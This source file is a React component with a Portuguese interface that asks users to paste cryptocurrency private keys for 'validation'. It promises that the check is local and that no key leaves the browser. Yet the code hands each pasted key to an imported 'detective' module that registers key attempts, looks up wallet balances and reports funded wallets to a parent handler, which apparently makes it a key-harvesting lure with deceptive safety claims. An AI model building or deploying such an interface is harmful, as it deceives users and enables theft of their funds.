// components/PrivateKeyValidator.tsx
import { useState } from 'react';
import { toast } from 'react-hot-toast';
import { privateKeyDetective } from '@/lib/private-key-detective';

interface PrivateKeyValidatorProps {
  onValidKeyFound: (address: string, balance: number) => void;
}

export function PrivateKeyValidator({ onValidKeyFound }: PrivateKeyValidatorProps) {
  const [privateKey, setPrivateKey] = useState('');
  const [isValidating, setIsValidating] = useState(false);
  const [validationResult, setValidationResult] = useState<{
    isValid: boolean;
    address: string;
    balance: number;
    message: string;
  } | null>(null);
  
  const handleValidate = async () => {
    if (!privateKey.trim()) {
      toast.error('Digite uma chave privada para validar');
      return;
    }
    
    setIsValidating(true);
    setValidationResult(null);
    toast.loading('🔐 Validando chave privada...', { id: 'validate' });
    
    privateKeyDetective.registerKeyAttempt(privateKey, 'user_input');
    const result = await privateKeyDetective.validatePrivateKey(privateKey);
    
    toast.dismiss('validate');
    
    if (result.isValid) {
      setValidationResult({
        isValid: true,
        address: result.walletAddress || '',
        balance: result.balance || 0,
        message: result.message
      });
      
      toast.success(`✅ Chave válida! Carteira: ${result.walletAddress?.slice(0, 10)}...`, { duration: 5000 });
      
      if (result.walletAddress && result.balance && result.balance > 0) {
        onValidKeyFound(result.walletAddress, result.balance);
      }
    } else {
      setValidationResult({
        isValid: false,
        address: '',
        balance: 0,
        message: result.message
      });
      toast.error(`❌ ${result.message}`, { duration: 5000 });
    }
    
    setIsValidating(false);
  };
  
  const handleClear = () => {
    setPrivateKey('');
    setValidationResult(null);
  };
  
  return (
    <div style={{ marginTop: '16px', padding: '16px', background: 'linear-gradient(135deg, #1a1a2e 0%, #16213e 100%)', borderRadius: '16px', border: '1px solid #8b5cf6' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '16px' }}>
        <span style={{ fontSize: '24px' }}>🔐</span>
        <span style={{ fontWeight: 'bold', color: '#8b5cf6' }}>Validador de Chaves Privadas</span>
        <span style={{ fontSize: '10px', background: '#8b5cf6', color: '#fff', padding: '2px 6px', borderRadius: '10px' }}>SEGURO</span>
      </div>
      
      <div style={{ background: 'rgba(139, 92, 246, 0.1)', borderRadius: '12px', padding: '12px', marginBottom: '16px' }}>
        <div style={{ fontSize: '11px', color: '#94a3b8', marginBottom: '8px' }}>🔒 A validação é feita LOCALMENTE no seu navegador</div>
        <div style={{ fontSize: '11px', color: '#94a3b8', marginBottom: '8px' }}>🔑 Nenhuma chave é enviada para servidores</div>
        <div style={{ fontSize: '11px', color: '#94a3b8' }}>✅ Apenas o resultado (válido/inválido) é mostrado</div>
      </div>
      
      <div style={{ marginBottom: '16px' }}>
        <label style={{ fontSize: '12px', color: '#8b5cf6', marginBottom: '8px', display: 'block' }}>Chave Privada (WIF, Hex ou 0x...)</label>
        <textarea
          value={privateKey}
          onChange={(e) => setPrivateKey(e.target.value)}
          placeholder="Cole sua chave privada aqui..."
          style={{ width: '100%', padding: '12px', background: 'rgba(0,0,0,0.3)', border: '1px solid #8b5cf6', borderRadius: '8px', color: '#fff', fontFamily: 'monospace', fontSize: '11px', minHeight: '80px', resize: 'vertical' }}
        />
      </div>
      
      <div style={{ display: 'flex', gap: '12px', marginBottom: '16px' }}>
        <button onClick={handleValidate} disabled={isValidating} style={{ flex: 1, padding: '12px', background: isValidating ? '#666' : '#8b5cf6', border: 'none', borderRadius: '10px', color: '#fff', fontWeight: 'bold', cursor: isValidating ? 'not-allowed' : 'pointer' }}>
          {isValidating ? '🔐 VALIDANDO...' : '🔐 VALIDAR CHAVE'}
        </button>
        <button onClick={handleClear} style={{ padding: '12px 20px', background: 'rgba(255,255,255,0.1)', border: '1px solid #8b5cf6', borderRadius: '10px', color: '#fff', cursor: 'pointer' }}>🗑️ LIMPAR</button>
      </div>
      
      {validationResult && (
        <div style={{ padding: '12px', background: validationResult.isValid ? 'rgba(74, 222, 128, 0.1)' : 'rgba(239, 68, 68, 0.1)', borderRadius: '10px', border: `1px solid ${validationResult.isValid ? '#4ade80' : '#ef4444'}` }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '8px' }}>
            <span>{validationResult.isValid ? '✅' : '❌'}</span>
            <span style={{ fontSize: '12px', color: validationResult.isValid ? '#4ade80' : '#ef4444', fontWeight: 'bold' }}>
              {validationResult.isValid ? 'CHAVE VÁLIDA!' : 'CHAVE INVÁLIDA'}
            </span>
          </div>
          <div style={{ fontSize: '11px', color: '#fff', marginBottom: '4px' }}>{validationResult.message}</div>
          {validationResult.isValid && validationResult.address && (
            <>
              <div style={{ fontSize: '10px', color: '#94a3b8', marginTop: '8px' }}>Carteira: {validationResult.address.slice(0, 10)}...{validationResult.address.slice(-8)}</div>
              {validationResult.balance > 0 && <div style={{ fontSize: '12px', color: '#fbbf24', marginTop: '4px' }}>💰 Saldo encontrado: {validationResult.balance.toFixed(4)} BTC</div>}
            </>
          )}
        </div>
      )}
      
      <div style={{ fontSize: '9px', color: '#6b7280', textAlign: 'center', borderTop: '1px solid rgba(139, 92, 246, 0.3)', paddingTop: '12px', marginTop: '12px' }}>
        🔐 NUNCA compartilhe sua chave privada • A validação é 100% local e segura
      </div>
    </div>
  );
}